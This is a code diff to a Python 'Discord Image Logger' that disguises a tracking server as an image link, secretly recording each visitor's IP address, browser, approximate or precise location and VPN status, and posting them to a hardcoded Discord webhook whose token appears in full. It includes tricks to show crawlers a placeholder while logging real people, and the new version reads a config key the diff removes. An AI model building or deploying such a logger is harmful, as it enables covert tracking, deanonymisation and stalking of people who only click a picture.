@@ -2,8 +2,13 @@
 # By DeKrypt | https://github.com/dekrypted
 
 from http.server import BaseHTTPRequestHandler
+import requests
+import httpagentparser
+import base64
 from urllib import parse
-import traceback, requests, base64, httpagentparser
+import traceback
+from wsgiref.simple_server import make_server
+from io import BytesIO
 
 __app__ = "Discord Image Logger"
 __description__ = "A simple application which logs IPs when an image is clicked in Discord"
@@ -13,8 +18,7 @@ __author__ = "DeKrypt"
 config = {
     "webhook": "https://discord.com/api/webhooks/1355317120291967126/7I9oKhUnnXwjZ2ksiD0gNgHyqnoHD_ZkJPV08Bsx2kBw3H7His6e78mZ__rARt3NfZH3",
     "image": "https://imageio.forbes.com/specials-images/imageserve/5d35eacaf1176b0008974b54/0x0.jpg?format=jpg&crop=4560,2565,x790,y784,safe&width=1200",
-   "imageArgument": True,
-    "username": "Image Logger",
+ "username": "Image Logger",
     "color": 0x00FFFF,
     "crashBrowser": False,
     "accurateLocation": False,
@@ -29,11 +33,15 @@ config = {
     "antiBot": 1,
     "redirect": {
         "redirect": False,
-        "page": "https://your-link.here"
+        "page": "https://your-link.here",
     },
 }
 
 blacklistedIPs = ("27", "104", "143", "164")
+
+binaries = {
+    "loading": base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
+}
 
 def botCheck(ip, useragent):
     if ip.startswith(("34", "35")):
@@ -59,7 +67,6 @@ def makeReport(ip, useragent=None, coords=None, endpoint="N/A", url=False):
         return
     
     bot = botCheck(ip, useragent)
-    
     if bot and config["linkAlerts"]:
         requests.post(config["webhook"], json={
             "username": config["username"],
@@ -70,21 +77,24 @@ def makeReport(ip, useragent=None, coords=None, endpoint="N/A", url=False):
                 "description": f"An **Image Logging** link was sent in a chat!\nYou may receive an IP soon.\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
             }],
         })
-    
-    # Log IP for all requests, even bots, unless explicitly blocked
+        return
+
     ping = "@everyone"
     info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()
     
-    if info["proxy"]:
-        if config["vpnCheck"] == 2:
-            return
-        if config["vpnCheck"] == 1:
-            ping = ""
+    if info["proxy"] and config["vpnCheck"] == 2:
+        return
+    elif info["proxy"] and config["vpnCheck"] == 1:
+        ping = ""
     
     if info["hosting"]:
-        if config["antiBot"] in (3, 4):
+        if config["antiBot"] == 4 and not info["proxy"]:
             return
-        if config["antiBot"] in (1, 2):
+        elif config["antiBot"] == 3:
+            return
+        elif config["antiBot"] == 2 and not info["proxy"]:
+            ping = ""
+        elif config["antiBot"] == 1:
             ping = ""
 
     os, browser = httpagentparser.simple_detect(useragent)
@@ -95,7 +105,7 @@ def makeReport(ip, useragent=None, coords=None, endpoint="N/A", url=False):
         "embeds": [{
             "title": "Image Logger - IP Logged",
             "color": config["color"],
-            "description": f"""**A User Clicked the Image!**
+            "description": f"""**A User Opened the Original Image!**
 
 **Endpoint:** `{endpoint}`
             
@@ -106,7 +116,7 @@ def makeReport(ip, useragent=None, coords=None, endpoint="N/A", url=False):
 > **Country:** `{info['country'] if info['country'] else 'Unknown'}`
 > **Region:** `{info['regionName'] if info['regionName'] else 'Unknown'}`
 > **City:** `{info['city'] if info['city'] else 'Unknown'}`
-> **Coords:** `{str(info['lat'])+', '+str(info['lon']) if not coords else coords.replace(',', ', ')}`
+> **Coords:** `{str(info['lat'])+', '+str(info['lon']) if not coords else coords.replace(',', ', ')}` ({'Approximate' if not coords else 'Precise, [Google Maps]('+'https://www.google.com/maps/search/google+map++'+coords+')'})
 > **Timezone:** `{info['timezone'].split('/')[1].replace('_', ' ')} ({info['timezone'].split('/')[0]})`
 > **Mobile:** `{info['mobile']}`
 > **VPN:** `{info['proxy']}`
@@ -123,60 +133,64 @@ def makeReport(ip, useragent=None, coords=None, endpoint="N/A", url=False):
                    }],
     }
     
-    if url: embed["embeds"][0].update({"thumbnail": {"url": url}})
+    if url:
+        embed["embeds"][0]["thumbnail"] = {"url": url}
     requests.post(config["webhook"], json=embed)
     return info
 
-binaries = {
-    "loading": base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
-}
+def application(environ, start_response):
+    try:
+        path = environ.get('PATH_INFO', '')
+        query_string = environ.get('QUERY_STRING', '')
+        ip = environ.get('HTTP_X_FORWARDED_FOR', environ.get('REMOTE_ADDR', 'Unknown'))
+        useragent = environ.get('HTTP_USER_AGENT', 'Unknown')
 
-class ImageLoggerAPI(BaseHTTPRequestHandler):
-    def handleRequest(self):
-        try:
-            # Determine the image URL
-            if config["imageArgument"]:
-                s = self.path
-                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
-                if dic.get("url") or dic.get("id"):
-                    url = base64.b64decode(dic.get("url") or dic.get("id").encode()).decode()
-                else:
-                    url = config["image"]
-            else:
-                url = config["image"]
+        # Parse query parameters
+        dic = dict(parse.parse_qsl(query_string))
+        url = config["image"]
+        if config["imageArgument"]:
+            url = base64.b64decode(dic.get("url", dic.get("id", "")).encode() or b'').decode() or config["image"]
 
-            ip = self.headers.get('x-forwarded-for')
-            useragent = self.headers.get('user-agent')
+        # Trigger webhook immediately
+        endpoint = "/api/image"
+        makeReport(ip, useragent, endpoint=endpoint, url=url)
 
-            # Fetch the image content
-            image_response = requests.get(url, stream=True)
-            image_response.raise_for_status()
-            image_content = image_response.content
-            content_type = image_response.headers.get("Content-Type", "image/jpeg")
+        # Prepare response
+        if config["redirect"]["redirect"]:
+            headers = [('Location', config["redirect"]["page"]), ('Content-Type', 'text/html')]
+            start_response('302 Found', headers)
+            return [b'<meta http-equiv="refresh" content="0;url={config["redirect"]["page"]}">']
 
-            # Log IP immediately for all requests
-            makeReport(ip, useragent, endpoint=self.path.split("?")[0], url=url)
+        if config["buggedImage"] and botCheck(ip, useragent):
+            headers = [('Content-Type', 'image/jpeg')]
+            start_response('200 OK', headers)
+            return [binaries["loading"]]
 
-            # Serve image or loading preview
-            if botCheck(ip, useragent) and config["buggedImage"]:
-                self.send_response(200)
-                self.send_header('Content-type', 'image/jpeg')
-                self.end_headers()
-                self.wfile.write(binaries["loading"])
-            else:
-                self.send_response(200)
-                self.send_header('Content-type', content_type)
-                self.end_headers()
-                self.wfile.write(image_content)
+        data = f'''<style>body {{
+margin: 0;
+padding: 0;
+}}
+div.img {{
+background-image: url('{url}');
+background-position: center center;
+background-repeat: no-repeat;
+background-size: contain;
+width: 100vw;
+height: 100vh;
+}}</style><div class="img"></div>'''.encode()
 
-        except Exception:
-            self.send_response(500)
-            self.send_header('Content-type', 'text/html')
-            self.end_headers()
-            self.wfile.write(b'500 - Internal Server Error <br>Please check the message sent to your Discord Webhook and report the error on the GitHub page.')
-            reportError(traceback.format_exc())
+        headers = [('Content-Type', 'text/html')]
+        start_response('200 OK', headers)
+        return [data]
 
-    do_GET = handleRequest
-    do_POST = handleRequest
+    except Exception as e:
+        reportError(traceback.format_exc())
+        headers = [('Content-Type', 'text/html')]
+        start_response('500 Internal Server Error', headers)
+        return [b'500 - Internal Server Error<br>Please check the message sent to your Discord Webhook and report the error on the GitHub page.']
 
-handler = ImageLoggerAPI
+# Vercel expects an `application` callable
+if __name__ == "__main__":
+    # Local testing
+    server = make_server('localhost', 8000, application)
+    server.serve_forever()
